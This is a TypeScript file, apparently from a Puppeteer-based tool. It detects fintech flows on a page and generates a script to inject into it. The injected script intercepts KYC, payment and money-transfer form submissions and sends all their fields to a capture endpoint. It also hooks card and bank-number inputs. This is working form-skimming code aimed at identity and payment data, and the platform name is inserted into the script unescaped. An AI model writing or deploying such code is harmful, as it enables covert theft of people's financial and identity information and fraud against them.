/**
 * Fintech-Specific Mode Detector & Injection
 *
 * Detects fintech-specific flows:
 * - Payment Processing
 * - Card/Bank Linking
 * - Money Transfers
 * - Investments/Trading
 * - KYC/Verification
 */

import type { Page } from 'puppeteer'

export interface FintechFlowConfig {
  platform: string
  hasKyc: boolean
  hasPaymentProcessing: boolean
  hasCardLinking: boolean
  hasInvestments: boolean
  hasMoneyTransfer: boolean
}

export async function detectFintechFlows(page: Page, platform: string): Promise<FintechFlowConfig> {
  console.info(`[FINTECH-MODE] Detecting fintech flows for ${platform}...`)

  try {
    const flows = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      kycElements: document.querySelectorAll(
        '[class*="kyc"], [class*="verification"], [class*="identity"]',
      ).length,
      paymentElements: document.querySelectorAll(
        '[class*="payment"], [class*="checkout"], [class*="billing"]',
      ).length,
      cardElements: document.querySelectorAll(
        '[class*="card"], [class*="bank"], [class*="account"]',
      ).length,
      investElements: document.querySelectorAll(
        '[class*="trade"], [class*="invest"], [class*="portfolio"]',
      ).length,
      transferElements: document.querySelectorAll(
        '[class*="transfer"], [class*="send"], [class*="remittance"]',
      ).length,
      hasKycText:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('identity'),
      hasPaymentText:
        pageText.includes('payment') ||
        pageText.includes('pay') ||
        pageText.includes('checkout'),
      hasCardText: pageText.includes('card') || pageText.includes('bank account'),
      hasInvestText:
        pageText.includes('trade') ||
        pageText.includes('invest') ||
        pageText.includes('stock'),
      hasTransferText: pageText.includes('transfer') || pageText.includes('send money'),
    }
  })

  return {
    platform,
    hasKyc: flows.kycElements > 0 || flows.hasKycText,
    hasPaymentProcessing: flows.paymentElements > 0 || flows.hasPaymentText,
    hasCardLinking: flows.cardElements > 0 || flows.hasCardText,
    hasInvestments: flows.investElements > 0 || flows.hasInvestText,
    hasMoneyTransfer: flows.transferElements > 0 || flows.hasTransferText,
  }
  } catch (error) {
    console.error(`[FINTECH-MODE] Error detecting fintech flows: ${error instanceof Error ? error.message : String(error)}`)
    return {
      platform,
      hasKyc: false,
      hasPaymentProcessing: false,
      hasCardLinking: false,
      hasInvestments: false,
      hasMoneyTransfer: false,
    }
  }
}

export function buildFintechModeInjectionCode(config: FintechFlowConfig): string {
  return `
<script>
// FINTECH-MODE: Fintech Flow Capture
(function() {
  var PLATFORM = '${config.platform}';
  var FLOWS = {
    kyc: ${config.hasKyc},
    payments: ${config.hasPaymentProcessing},
    cardLinking: ${config.hasCardLinking},
    investments: ${config.hasInvestments},
    transfers: ${config.hasMoneyTransfer}
  };

  console.log('[FINTECH-MODE] Initialized for ' + PLATFORM);
  console.log('[FINTECH-MODE] Flows:', FLOWS);

  // KYC/Identity Verification Capture
  if (FLOWS.kyc) {
    console.log('[FINTECH-MODE] KYC flow detected');
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && (
        form.innerHTML.toLowerCase().includes('verify') ||
        form.innerHTML.toLowerCase().includes('kyc') ||
        form.innerHTML.toLowerCase().includes('identity')
      )) {
        console.log('[FINTECH-MODE] KYC form intercepted');
        var formData = new FormData(form);
        var payload = {
          type: 'fintech_kyc',
          platform: PLATFORM,
          timestamp: new Date().toISOString(),
          data: Object.fromEntries(formData)
        };
        fetch('/api/v1/fintech-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function() {});
      }
    }, true);
  }

  // Payment Processing Capture
  if (FLOWS.payments) {
    console.log('[FINTECH-MODE] Payment processing flow detected');
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && (
        form.innerHTML.toLowerCase().includes('pay') ||
        form.innerHTML.toLowerCase().includes('checkout') ||
        form.innerHTML.toLowerCase().includes('billing')
      )) {
        console.log('[FINTECH-MODE] Payment form intercepted');
        var formData = new FormData(form);
        var payload = {
          type: 'fintech_payment',
          platform: PLATFORM,
          timestamp: new Date().toISOString(),
          data: Object.fromEntries(formData)
        };
        fetch('/api/v1/fintech-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function() {});
      }
    }, true);
  }

  // Card & Bank Linking Capture
  if (FLOWS.cardLinking) {
    console.log('[FINTECH-MODE] Card linking flow detected');
    var cardInputs = document.querySelectorAll(
      'input[type="text"][maxlength="19"],' +
      'input[placeholder*="card"],' +
      'input[placeholder*="number"],' +
      'input[placeholder*="account"]'
    );
    cardInputs.forEach(function(input) {
      var originalValue = Object.getOwnPropertyDescriptor(input, 'value');
      Object.defineProperty(input, 'value', {
        get: function() {
          return originalValue ? originalValue.get.call(this) : this.getAttribute('value');
        },
        set: function(val) {
          console.log('[FINTECH-MODE] Card/Bank data input detected');
          if (originalValue) {
            originalValue.set.call(this, val);
          } else {
            this.setAttribute('value', val);
          }
        }
      });
    });
  }

  // Investment/Trading Capture
  if (FLOWS.investments) {
    console.log('[FINTECH-MODE] Investment flow detected');
    var tradeButtons = document.querySelectorAll('button, a, [role="button"]');
    tradeButtons.forEach(function(btn) {
      if (btn.textContent.toLowerCase().includes('trade') ||
          btn.textContent.toLowerCase().includes('buy') ||
          btn.textContent.toLowerCase().includes('sell') ||
          btn.textContent.toLowerCase().includes('invest')) {
        btn.addEventListener('click', function(e) {
          console.log('[FINTECH-MODE] Investment action initiated:', e.target.textContent);
        });
      }
    });
  }

  // Money Transfer Capture
  if (FLOWS.transfers) {
    console.log('[FINTECH-MODE] Money transfer flow detected');
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && (
        form.innerHTML.toLowerCase().includes('transfer') ||
        form.innerHTML.toLowerCase().includes('send') ||
        form.innerHTML.toLowerCase().includes('recipient')
      )) {
        console.log('[FINTECH-MODE] Transfer form intercepted');
        var formData = new FormData(form);
        var payload = {
          type: 'fintech_transfer',
          platform: PLATFORM,
          timestamp: new Date().toISOString(),
          data: Object.fromEntries(formData)
        };
        fetch('/api/v1/fintech-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function() {});
      }
    }, true);
  }

  console.log('[FINTECH-MODE] Initialization complete');
})();
</script>
`
}
